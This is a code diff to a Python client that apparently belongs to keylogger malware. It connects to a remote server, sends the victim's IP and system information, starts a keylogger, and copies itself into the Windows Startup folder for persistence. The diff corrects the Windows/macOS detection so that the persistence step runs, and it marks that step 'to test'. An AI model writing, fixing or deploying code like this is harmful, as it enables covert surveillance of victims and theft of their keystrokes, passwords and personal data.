@@ -17,9 +17,9 @@ class Client:
         # True = os is mac | False = os is windows
         self.mod = True
         if self.os == "Darwin":
-            self.mod = True
-        elif self.os == "Windows":
             self.mod = False
+        elif self.os == "Windows":
+            self.mod = True
         else:
             exit()
 
@@ -34,7 +34,7 @@ class Client:
     def conn_server(self):
         self.client.connect((self.host, self.port))
         print("Connessione effettuata!")
-        sleep(2)
+        sleep(1.5)
         self.get_vinfo()
         self.key_logger()
 
@@ -49,9 +49,9 @@ class Client:
         msg = f"ip: {ip} AND info: {pc_information}"
         self.sendmsg(msg)
 
-    # Set the file of auto-startup if the os is windows
+    # Set the file of auto-startup if the os is windows | <to test>
     def os_set(self):
-        if not self.os:
+        if self.mod:
             path_startup = fr"C:\Users\{environ['USER']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
             copyfile(self.path_file, path_startup)
 
